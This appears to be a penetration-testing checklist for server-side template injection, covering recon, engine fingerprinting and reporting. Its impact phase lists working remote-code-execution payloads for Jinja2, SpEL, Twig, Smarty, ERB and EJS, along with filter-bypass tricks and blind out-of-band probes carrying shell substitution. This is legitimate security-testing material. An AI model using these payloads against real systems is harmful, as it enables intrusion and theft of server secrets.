# SSTI Testing Checklist — tick per sink

> Companion to `SSTI_TESTING_GUIDE.md`. The finding is **server-side evaluation → RCE** (or sandboxed file-read/secret),
> never a lone `{{7*7}}=49`. Work top-to-bottom **per template sink**; stop and report only when impact is proven.

## PHASE 0 — Recon (§3)
- [ ] Found every place user input is **rendered by a server template** (templates/email/PDF/report/reflected fields).
- [ ] Flagged "customize template" / page-builder / invoice features (high-yield).
- [ ] Grepped source/JS for `render_template_string` / `Template().render` / `Handlebars.compile` / `ERB.new` with user input.
- [ ] Noted stack hints (Server header, errors → Python/Java/PHP/Ruby/Node).
- [ ] Stood up an OOB host for blind cases.

## PHASE 1 — Baseline: confirm SERVER-SIDE eval (§4)  ← the make-or-break
- [ ] Ran the **differential** probe: `{{1337*1338}}`→`1788906` AND `{{7*'7'}}`→`7777777` (non-round operands).
- [ ] Verified the **server response** computed it (before any JS) and the literal `{{...}}` is gone.
- [ ] **Ruled out CSTI** (Angular/Vue evaluating in the browser → XSS kit), reflection, and coincidence.

## PHASE 2 — Fingerprint (§5/§6)
- [ ] Identified the engine via the decision tree (Jinja2/Twig/Freemarker/Velocity/SpEL/ERB/Smarty/EJS/Pug/Nunjucks).
- [ ] **Java app reflecting `${}`/`%{}`/`#{}`?** → consider **OGNL/MVEL/Java-EL** injection (Struts/Confluence), not just a template engine (§8.4).
- [ ] Read the context (text/attribute/statement) and checked for a **sandbox** (`{{config}}`/`__class__` blocked?).

## PHASE 3 — Impact: engine → RCE (§7–§13)
- [ ] **Python/Jinja2 (§7):** `{{cycler.__init__.__globals__.os.popen('id').read()}}` → RCE; else `{{config}}`→SECRET_KEY.
- [ ] **Java (§8):** Freemarker `?new()("id")` / SpEL `T(java.lang.Runtime).getRuntime().exec("id")` / **Groovy** `${"id".execute().text}` (Jenkins/GroovyTemplateEngine, §8.5).
- [ ] **OGNL/EL (§8.4):** Struts (CVE-2017-5638) / Confluence (CVE-2021-26084, CVE-2022-26134) published PoC → unauth RCE.
- [ ] **PHP (§9):** Twig `{{['id']|filter('system')}}` / Smarty `{system('id')}`.
- [ ] **Ruby/Node (§10):** ERB `<%=\`id\`%>` / EJS/Pug/Nunjucks `process.mainModule.require('child_process').execSync('id')`.
- [ ] **Other Node (§10.1):** doT `{{=…}}` · Eta/Marko `constructor.constructor('return process')()…execSync('id')` · Squirrelly helper-injection; Hogan/Mustache/Dust = logic-less → data-disclosure/XSS, not RCE.
- [ ] **Sandbox (§11):** escaped via globals/attribute tricks; else fell back to file read / `{{config}}` secrets.
- [ ] **Filter/WAF bypass (§11.1):** blocked `{{`→`{%print%}` · `.`→`|attr()`/`['..']` · keyword→**request.args smuggling** (`?g=__globals__`).
- [ ] **Blind (§13):** confirmed via time delay and/or server-sourced OOB carrying `$(whoami)`.
- [ ] Proved RCE with a **benign marker** (`id`); (red-team only) shell + pivot; **cleaned up**.

## PHASE 4 — Validate → report
- [ ] Proved **server-side** evaluation differentially + identified the engine (FP check §15).
- [ ] Reached **RCE** (or, if sandboxed, file read / `{{config}}` secrets = High).
- [ ] Used a benign marker; validated read secrets read-only; redacted (e.g. SECRET_KEY).
- [ ] Confirmed on **production**; re-tested partial fixes (blocked `{{config}}` but not `cycler` globals).
- [ ] Set CVSS 3.1 + **CWE-1336 (+ CWE-94)** (§16).
- [ ] De-duped to one finding per sink; led with RCE; filed any client-side `{{}}` as **XSS**, not SSTI (§19).

## AUTO-REJECT (don't submit if…)
- [ ] A lone `{{7*7}}=49` with no differential / no engine / no impact.
- [ ] Client-side `{{}}` evaluated in the **browser** (Angular/Vue) → that's CSTI/XSS.
- [ ] `{{7*7}}` reflected **literally** as `7*7` (not evaluated).
- [ ] Only a template **error**/stack trace, no evaluation.
- [ ] `49` that the page could already contain (use `1337*1338`).
- [ ] "tplmap said vulnerable" with no manual differential + impact.
